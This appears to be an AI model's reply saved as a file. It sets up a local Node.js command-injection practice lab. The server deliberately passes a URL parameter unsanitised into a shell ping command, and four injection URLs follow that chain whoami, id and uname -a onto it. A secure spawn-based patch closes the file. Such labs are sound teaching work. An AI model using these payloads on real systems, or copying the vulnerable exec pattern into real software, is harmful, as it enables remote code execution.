@@ -1,0 +1,123 @@
+To practice testing the RCE/command injection operators you just learned, here is a complete, self-contained local laboratory environment using Node.js.
+Node.js is excellent for this because it uses the native child_process.exec function, which maps inputs directly to your Ubuntu terminal shell (/bin/sh).
+Follow these steps to set up and run the lab inside your ~/hack folder.
+------------------------------
+## Step 1: Create the Vulnerable Server (rce_server.js)
+This script spins up a local web server on port 8085. It takes a target query parameter from the URL and drops it straight into an OS terminal command without any filtering or sanitization.
+Run this command in your terminal to create the server file:
+
+cat << 'EOF' > rce_server.js
+const http = require('http');
+const url = require('url');
+const { exec } = require('child_process');
+
+const PORT = 8085;
+
+const server = http.createServer((req, res) => {
+    const parsedUrl = url.parse(req.url, true);
+    
+    // Serve a simple HTML dashboard interface
+    if (parsedUrl.pathname === '/') {
+        res.writeHead(200, { 'Content-Type': 'text/html' });
+        res.end(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Local RCE Practice Lab</title></head>
+            <body style="font-family:sans-serif; padding:40px; background:#f4f7f6;">
+                <div style="background:white; padding:30px; max-width:500px; margin:0 auto; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.05);">
+                    <h2>Network Diagnostic Portal</h2>
+                    <p>Enter an IP address to execute a local system ping test:</p>
+                    <form action="/ping" method="GET">
+                        <input type="text" name="target" placeholder="e.g. 127.0.0.1" style="width:100%; padding:10px; margin-bottom:15px; border-radius:4px; border:1px solid #ccc;">
+                        <button type="submit" style="width:100%; padding:10px; background:#007bff; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Run Diagnostic</button>
+                    </form>
+                </div>
+            </body>
+            </html>
+        `);
+        return;
+    }
+
+    // Vulnerable endpoint processing system terminal commands
+    if (parsedUrl.pathname === '/ping') {
+        const targetIp = parsedUrl.query.target;
+
+        if (!targetIp) {
+            res.writeHead(400, { 'Content-Type': 'text/plain' });
+            res.end('Missing target parameter.');
+            return;
+        }
+
+        // DANGEROUS: Input string is directly concatenated into an operating system command template
+        const systemCommand = `ping -c 1 ${targetIp}`;
+        console.log(`[🚀 SYSTEM WORKING]: Executing command -> ${systemCommand}`);
+
+        exec(systemCommand, (error, stdout, stderr) => {
+            res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+            
+            // Return whatever output the terminal generated straight back to the user browser
+            if (error) {
+                res.end(`System Command Failed/Errored out.\n\nTerminal Output:\n${stdout}\n${stderr}`);
+                return;
+            }
+            res.end(`System Diagnostic Successful!\n\nTerminal Output:\n${stdout}`);
+        });
+        return;
+    }
+
+    res.writeHead(404, { 'Content-Type': 'text/plain' });
+    res.end('Not Found');
+});
+
+server.listen(PORT, () => {
+    console.log(`\n📡 [VULNERABLE RCE LAB ACTIVE] -> Listening on http://localhost:${PORT}`);
+    console.log(`💡 Test standard behavior: http://localhost:${PORT}/ping?target=127.0.0.1`);
+});
+EOF
+
+------------------------------
+## Step 2: Start the Laboratory Server
+Launch your newly created Node script directly inside your terminal session:
+
+node rce_server.js
+
+Keep this terminal window visible so you can watch the system logs capture inputs in real time.
+------------------------------
+## Step 3: Execute Your Operator Test Permutations
+Open your web browser or open a secondary terminal tab to fire these ready-to-run exploit permutations. Notice how different layout variations behave when breaking the system command border logic:
+## Test 1: The Semicolon Operator (Sequential Execution)
+Forces the system to run whoami right after completing a single ping check:
+
+http://localhost:8085/ping?target=127.0.0.1; whoami
+
+## Test 2: The Logical AND Operator (&&)
+Only runs the secondary command (id) if the initial network ping returns successfully:
+
+http://localhost:8085/ping?target=127.0.0.1 %26%26 id
+
+(Note: %26%26 is the URL-encoded layout for &&)
+## Test 3: The Logical OR Operator (||)
+If you supply a broken network target that causes the initial ping command to crash, the logical || steps in and executes uname -a as a fallback strategy:
+
+http://localhost:8085/ping?target=invalid-address %7C%7C uname -a
+
+(Note: %7C%7C is the URL-encoded layout for ||)
+## Test 4: The Newline Operator (%0a)
+Simulates hitting the "Enter" key on a keyboard to spawn your command on a clean, isolated line execution sequence:
+
+http://localhost:8085/ping?target=127.0.0.1%0awhoami
+
+------------------------------
+## 🛡️ How to Secure the Server File (The Patch)
+To completely eliminate command injection vulnerabilities, security engineers replace generic string execution maps with Argument Arrays. When arguments are handled as a strict array list rather than a concatenated text string, the operating system treats inputs completely as plain text data, never as an active command.
+If you want to view how the safe alternative looks, you would swap out exec for execFile or spawn:
+
+const { spawn } = require('child_process');
+// SECURE: Arguments are isolated cleanly inside an array structure// Even if targetIp contains "; whoami", the system tries to physically ping an IP named "; whoami" and fails safely.const child = spawn('ping', ['-c', '1', targetIp]);
+
+child.stdout.on('data', (data) => {
+    // Process output buffer text safely...
+});
+
+Would you like to build an automated testing profile for your Puppeteer scanner tool script to detect if a network utility field responds to these shell symbol variables automatically?
+
